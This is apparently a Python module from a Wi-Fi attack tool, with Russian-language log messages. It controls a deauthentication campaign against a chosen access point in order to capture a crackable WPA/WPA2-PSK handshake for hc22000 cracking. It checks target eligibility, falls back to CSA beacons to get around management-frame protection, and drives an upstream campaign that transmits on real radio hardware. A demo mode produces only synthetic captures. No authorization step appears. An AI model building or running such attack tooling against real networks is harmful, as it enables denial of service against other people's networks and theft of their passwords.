"""Deauth campaign control. TX goes only through the pinned upstream DeauthCampaign.

Upstream owns the radio rules: a channel-only lease, PMF fallback to CSA beacons,
and the stop condition (a NEW crackable handshake on the target). This module adds
session bookkeeping and a DEMO shim with the same surface; the shim never imports
upstream and never touches real radio hardware.
"""
from __future__ import annotations
import asyncio
import hashlib
import time
from datetime import datetime, timezone


def utcnow():
    return datetime.now(timezone.utc).isoformat()


def demo_capture_for(ssid: str, nonce: int) -> str:
    """A structurally valid synthetic hc22000 line for DEMO captures only.

    Deterministic per (ssid, nonce); the ESSID hex spells the fake network name so a
    leaked DEMO line can never be mistaken for a live capture. Never send it anywhere.
    """
    ssid_hex = f"DEMO-{ssid or 'hidden'}".encode().hex()
    seed = hashlib.sha256(f"{ssid}:{nonce}".encode()).hexdigest()
    mac = f"0200000000{seed[:2]}"        # locally administered, obviously synthetic
    return (f"WPA*01*{seed[:32]}*{mac}*{mac}*{ssid_hex}***")


class DemoDeauth:
    """Demo twin of DeauthCampaign: same attributes, synthetic progress, no radio.

    "Captures" a handshake for the target after a settle delay so the whole
    deauth → capture → hc22000 → export pipeline can be exercised without USB.
    """
    def __init__(self, target_bssid, ssid, on_capture):
        self.target = type("T", (), {"bssid": target_bssid, "ssid": ssid, "channel": 6})()
        self.client_sent = self.client_acks = self.bcast_sent = self.csa_sent = 0
        self.captured = False
        self.stopped = False
        self._on_capture = on_capture
        self._task = None

    def run(self):
        self._task = asyncio.get_running_loop().create_task(self._loop())
        return True

    @property
    def done(self):
        return self._task is not None and self._task.done()

    def request_stop(self):
        self.stopped = True

    async def _loop(self):
        try:
            for _ in range(6):                     # ~3 s of synthetic bursts
                if self.stopped:
                    return
                await asyncio.sleep(0.5)
                self.client_sent += 2
                self.client_acks += 1
                self.bcast_sent += 2
            if not self.stopped:
                self.captured = True
                self._on_capture(self.target.bssid)
        except asyncio.CancelledError:
            raise

    async def stop(self):
        self.stopped = True
        if self._task:
            try:
                await asyncio.wait_for(asyncio.shield(self._task), timeout=2)
            except (asyncio.TimeoutError, asyncio.CancelledError):
                pass


class DeauthControl:
    """At most one deauth target per session; snapshot() feeds the API state."""
    def __init__(self, engine):
        self.engine = engine
        self.campaign = None
        self.started_at = None
        self.error = ""

    def reset(self):
        self.campaign = None
        self.started_at = None
        self.error = ""

    @property
    def active(self):
        return self.campaign is not None and not self.campaign.done

    def snapshot(self):
        campaign = self.campaign
        if campaign is None:
            return {"active": False, "bssid": "", "ssid": "", "captured": False,
                    "stats": {}, "started_at": None, "error": self.error}
        return {
            "active": self.active,
            "bssid": campaign.target.bssid,
            "ssid": getattr(campaign.target, "ssid", "") or "",
            "captured": bool(campaign.captured),
            "stats": {"client_sent": campaign.client_sent, "client_acks": campaign.client_acks,
                      "bcast_sent": campaign.bcast_sent, "csa_sent": campaign.csa_sent},
            "started_at": self.started_at,
            "error": self.error,
        }

    def _demo_capture(self, bssid):
        ssid = next((n["ssid"] for n in self.engine.networks if n["bssid"] == bssid), "")
        self.engine.register_demo_capture(bssid, demo_capture_for(ssid, time.time_ns()))
        self.engine.log("DEMO: синтетический захват записан для " + (ssid or bssid))

    async def start(self, bssid):
        if self.active:
            raise ValueError("Deauth уже выполняется. Сначала остановите текущую цель.")
        if self.engine.phase != "scanning":
            raise ValueError("Сначала запустите сканирование.")
        bssid = (bssid or "").strip().lower()
        if self.engine.demo:
            network = next((n for n in self.engine.networks if n["bssid"] == bssid), None)
            if network is None:
                raise ValueError("Сеть не найдена в DEMO-снимке.")
            if not network.get("psk_family", False):
                raise ValueError("DEMO-цель не WPA/WPA2-PSK: deauth не покажет крэкабельный хендшейк.")
            campaign = DemoDeauth(bssid, network["ssid"] or "", self._demo_capture)
        else:
            campaign = self._live_campaign(bssid)
        self.campaign, self.started_at, self.error = campaign, utcnow(), ""
        campaign.run()
        self.engine.log("Deauth запущен против " + bssid + (" (DEMO)" if self.engine.demo else ""))
        return self.snapshot()

    def _live_campaign(self, bssid):
        """Build the upstream campaign after the PSK-family/PMF eligibility checks."""
        array = self.engine.array
        if array is None:
            raise ValueError("Нет активной сессии приёма.")
        ap = array.access_points.get(bssid)
        if ap is None:
            raise ValueError("Сеть не найдена в текущем снимке. Обновите состояние.")
        from wifit3.crack.handshake import PSK_CAPTURE_AKMS
        from wifit3.dot11.pmf import PmfPosture
        from wifit3.campaigns.deauth import DeauthCampaign
        if not (PSK_CAPTURE_AKMS & set(ap.akm_suites or [])):
            raise ValueError("Цель не подтверждена как WPA/WPA2-PSK: deauth не покажет крэкабельный хендшейк.")
        if ap.pmf_posture in (PmfPosture.REQUIRED, PmfPosture.INVALID) and not ap.last_beacon_frame:
            raise ValueError("PMF required/invalid без захваченного маяка: нечем послать CSA.")
        return DeauthCampaign(array, ap, log=lambda m: self.engine.log(str(m).replace("[/]", "").replace("[", "").replace("]", "")))

    async def stop(self):
        if self.campaign is None:
            return self.snapshot()
        try:
            await self.campaign.stop()
        except Exception as exc:
            self.error = f"Остановка deauth сообщила об ошибке: {exc}"
            self.engine.log(self.error)
        self.campaign = None
        return self.snapshot()

    async def close(self):
        """Session teardown: request a cooperative stop without awaiting the task."""
        if self.campaign is not None:
            try:
                self.campaign.request_stop()
            except Exception:
                pass
            self.campaign = None
